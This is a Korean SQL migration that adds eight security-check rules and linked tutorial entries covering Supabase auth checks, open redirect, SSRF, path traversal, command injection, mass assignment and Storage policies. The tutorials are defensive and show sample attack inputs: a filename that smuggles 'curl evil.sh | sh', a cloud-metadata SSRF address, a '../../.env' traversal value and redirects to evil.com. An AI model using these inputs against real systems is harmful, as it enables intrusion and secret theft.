-- 보안 점검 규칙 8개 추가(SEC-015~022)와 개념 사전 연결.
-- 규칙은 모두 개념 하나 이상에 연결돼 있어야 한다(CLAUDE.md '학습 도우미').

insert into lego.rules (id, title, category, severity, detector) values
  ('SEC-015', '서버에서 getSession() 결과를 그대로 믿음', 'auth', 'high', 'regex'),
  ('SEC-016', '미들웨어에서만 로그인 확인', 'auth', 'medium', 'llm'),
  ('SEC-017', '요청 값으로 바로 이동하는 열린 리다이렉트', 'config', 'medium', 'ast'),
  ('SEC-018', '사용자가 준 URL 로 서버가 요청 (SSRF)', 'injection', 'high', 'ast'),
  ('SEC-019', '사용자 입력이 들어간 파일 경로 (경로 조작)', 'injection', 'high', 'ast'),
  ('SEC-020', '사용자 입력으로 명령 실행·eval', 'injection', 'critical', 'ast'),
  ('SEC-021', '요청 값을 통째로 저장 (Mass Assignment)', 'auth', 'high', 'ast'),
  ('SEC-022', '공개 Storage 버킷 / 넓게 열린 Storage 정책', 'database', 'high', 'sql')
on conflict (id) do update set
  title = excluded.title,
  category = excluded.category,
  severity = excluded.severity,
  detector = excluded.detector;

insert into lego.concepts (slug, title, summary, body_md, related_rule_ids, sort_order) values
('supabase-get-user', 'getSession 과 getUser', '서버에서는 쿠키에 든 세션을 그대로 믿지 말고 getUser 로 토큰을 검증해야 합니다.',
$md$## 무엇인가요
Supabase 의 `auth.getSession()` 은 쿠키에 저장된 세션을 **읽기만** 합니다. `auth.getUser()` 는 그 토큰을 Supabase Auth 서버에 보내 진짜인지 확인합니다.

## 왜 위험한가요
- 쿠키는 브라우저가 보내는 값이라 사용자가 마음대로 바꿀 수 있습니다.
- 서버 코드(미들웨어, Server Component, Route Handler)가 `getSession()` 결과의 `user.id` 로 권한을 판단하면, 위조한 쿠키로 다른 사람 행세를 할 수 있습니다.

## 어떻게 막나요
1. 서버에서는 `supabase.auth.getUser()` 또는 서명을 검증하는 `getClaims()` 를 씁니다.
2. `getSession()` 은 브라우저에서 화면 표시용으로만 씁니다.
3. 미들웨어에서도 같은 규칙을 지킵니다. Supabase 공식 예제도 미들웨어에서 `getUser()` 를 부릅니다.$md$,
'{SEC-015}', 160),
('middleware-auth', '미들웨어만으로 로그인 확인', '미들웨어는 길목 검사일 뿐입니다. 데이터를 읽는 페이지와 API 안에서도 사용자를 다시 확인해야 합니다.',
$md$## 무엇인가요
Next.js 의 `middleware.ts`(16 부터 `proxy.ts`)는 요청이 페이지에 닿기 전에 먼저 실행됩니다. 여기서 로그인 안 한 사용자를 `/login` 으로 보내는 경우가 많습니다.

## 왜 위험한가요
- `matcher` 에서 경로 하나만 빠져도 그 페이지는 아무나 열 수 있습니다.
- 미들웨어를 건너뛰는 취약점이 실제로 있었습니다(2025년 `x-middleware-subrequest` 헤더 우회).
- 페이지가 service_role(admin) 클라이언트로 데이터를 읽으면 RLS 도 막아 주지 않습니다.

## 어떻게 막나요
- 미들웨어는 화면 이동용으로 두고, 데이터를 읽는 Server Component·Route Handler·Server Action 맨 앞에서 `getUser()` 로 다시 확인합니다.
- 공통 함수(`requireUser()` 등)를 만들어 매번 부르면 빠뜨리기 어렵습니다.$md$,
'{SEC-016}', 170),
('open-redirect', '열린 리다이렉트', '로그인 후 이동할 주소를 쿼리로 받아 그대로 쓰면, 공격자가 만든 피싱 사이트로 사용자를 보낼 수 있습니다.',
$md$## 무엇인가요
`/login?next=/dashboard` 처럼 이동할 주소를 요청으로 받아 `redirect(next)` 하는 코드입니다.

## 왜 위험한가요
- `next=https://evil.com` 이나 `next=//evil.com` 을 넣은 링크를 보내면, 사용자는 진짜 사이트에서 로그인한 뒤 가짜 사이트로 이동합니다.
- `${origin}${next}` 도 안전하지 않습니다. `next=@evil.com` 이면 `https://내사이트@evil.com` 이 되어 evil.com 으로 갑니다.
- OAuth 콜백에서 생기면 토큰이 새어 나갈 수도 있습니다.

## 어떻게 막나요
1. `/` 로 시작하고 `//`, `/\` 로 시작하지 않는 경로만 허용합니다.
2. 또는 `new URL(next, origin).origin === origin` 인지 확인합니다.
3. 검사 함수를 하나 만들어(`safeNextPath`) 모든 이동에 씁니다.$md$,
'{SEC-017}', 180),
('ssrf', 'SSRF (서버를 시켜 요청하기)', '사용자가 준 URL 로 서버가 요청하면, 밖에서는 닿지 않는 내부 주소까지 대신 열어 주게 됩니다.',
$md$## 무엇인가요
"링크 미리보기", "URL 로 파일 가져오기"처럼 서버가 사용자가 준 주소로 `fetch` 하는 기능에서 생깁니다.

## 왜 위험한가요
- `http://169.254.169.254/` 같은 클라우드 메타데이터 주소로 서버의 접근 키를 빼낼 수 있습니다.
- `http://localhost:5432`, 사내망 주소처럼 바깥에서는 막힌 곳에 서버를 통해 들어갈 수 있습니다.

## 어떻게 막나요
1. 가능하면 허용할 도메인 목록을 두고 `new URL(url).hostname` 이 목록에 있는지 확인합니다.
2. `https:` 만 허용하고, 사설 IP·localhost 로 풀리는 주소는 막습니다.
3. 리다이렉트를 따라가지 않게 하거나, 따라간 주소도 다시 검사합니다.$md$,
'{SEC-018}', 190),
('path-traversal', '경로 조작 (../)', '파일 이름을 요청으로 받아 경로에 붙이면 ../ 로 다른 폴더의 파일을 읽을 수 있습니다.',
$md$## 무엇인가요
`readFile(path.join(UPLOAD_DIR, file))` 처럼 요청으로 받은 이름을 파일 경로에 붙이는 코드입니다.

## 왜 위험한가요
`file=../../.env` 를 넣으면 업로드 폴더 밖으로 나가 서버의 비밀값 파일이나 소스 코드를 읽습니다. 쓰기·삭제 함수라면 서버 파일을 덮어쓸 수도 있습니다.

## 어떻게 막나요
1. `path.basename(file)` 으로 폴더 부분을 잘라 냅니다.
2. 또는 `path.resolve` 한 결과가 기준 폴더로 시작하는지 확인합니다.
3. 파일은 이름 대신 DB 의 id 로 찾고, 실제 경로는 서버가 정합니다.$md$,
'{SEC-019}', 200),
('command-injection', '명령 주입과 eval', '사용자 입력을 셸 명령이나 eval 에 넣으면 공격자가 서버에서 원하는 명령을 실행할 수 있습니다.',
$md$## 무엇인가요
``exec(`convert ${name} out.png`)`` 처럼 문자열로 셸 명령을 만들거나, `eval(input)`·`new Function(input)` 으로 입력을 코드로 실행하는 것입니다.

## 왜 위험한가요
`name` 에 `a.png; curl evil.sh | sh` 를 넣으면 뒤의 명령도 실행됩니다. 서버를 통째로 넘겨주는 것과 같아서 가장 심각한 취약점 중 하나입니다.

## 어떻게 막나요
1. `exec` 대신 `execFile("convert", [name, "out.png"])` 처럼 프로그램과 인자를 나눠 넘깁니다. 셸을 거치지 않습니다.
2. 인자 앞에 `--` 를 넣어 옵션으로 해석되지 않게 합니다.
3. `eval` 은 쓰지 않습니다. 계산식이 필요하면 전용 파서를 씁니다.$md$,
'{SEC-020}', 210),
('mass-assignment', 'Mass Assignment (통째 저장)', '요청으로 받은 객체를 그대로 저장하면 사용자가 보내지 말아야 할 필드(role, plan)까지 바꿀 수 있습니다.',
$md$## 무엇인가요
`update(await req.json())`, `update(Object.fromEntries(formData))`, `{ ...body }` 처럼 받은 값을 필드를 고르지 않고 DB 에 넣는 코드입니다.

## 왜 위험한가요
화면에는 이름 칸만 있어도, 요청은 누구나 직접 만들 수 있습니다. `is_admin=true`, `plan=pro`, `user_id=남의 id` 를 끼워 보내면 그대로 저장됩니다. service_role 클라이언트를 쓰면 RLS 도 막아 주지 않습니다.

## 어떻게 막나요
1. Zod 같은 스키마로 허용할 필드만 정의하고 `parse` 결과만 저장합니다(`z.object` 는 모르는 키를 버립니다).
2. 또는 `{ name: body.name }` 처럼 필드를 하나씩 골라 넣습니다.
3. `user_id`, `role` 같은 값은 요청이 아니라 서버가 정합니다.$md$,
'{SEC-021}', 220),
('storage-buckets', 'Supabase Storage 버킷과 정책', '공개 버킷은 주소만 알면 누구나 파일을 받습니다. 비공개 버킷도 storage.objects 정책으로 소유자를 확인해야 합니다.',
$md$## 무엇인가요
Supabase Storage 의 버킷은 `public` 설정과 `storage.objects` 테이블의 RLS 정책으로 접근을 정합니다.

## 왜 위험한가요
- `public = true` 버킷의 파일은 로그인 없이 URL 로 받을 수 있습니다. 계약서·영수증 같은 개인 파일이 들어가면 그대로 공개됩니다.
- 정책이 `bucket_id = 'documents'` 만 확인하면, 로그인한 누구나 남의 파일을 읽거나 덮어쓸 수 있습니다.

## 어떻게 막나요
1. 개인 파일은 비공개 버킷에 두고, 내려받을 때 짧은 서명 URL(`createSignedUrl`)을 만듭니다.
2. 정책에 소유자 조건을 넣습니다. 예: `(storage.foldername(name))[1] = auth.uid()::text`, 파일은 `사용자id/파일명` 경로로 올립니다.
3. 공개 버킷은 프로필 사진처럼 정말 공개해도 되는 파일에만 씁니다.$md$,
'{SEC-022}', 230)
on conflict (slug) do update set
  title = excluded.title,
  summary = excluded.summary,
  body_md = excluded.body_md,
  related_rule_ids = excluded.related_rule_ids,
  sort_order = excluded.sort_order;

-- 기존 개념에도 관련 규칙을 잇는다.
update lego.concepts
set related_rule_ids = array(select distinct unnest(related_rule_ids || extra) order by 1)
from (values
  ('server-auth-check', '{SEC-015,SEC-016}'::text[]),
  ('rls', '{SEC-022}'::text[]),
  ('server-action', '{SEC-021}'::text[])
) as t(slug, extra)
where lego.concepts.slug = t.slug;
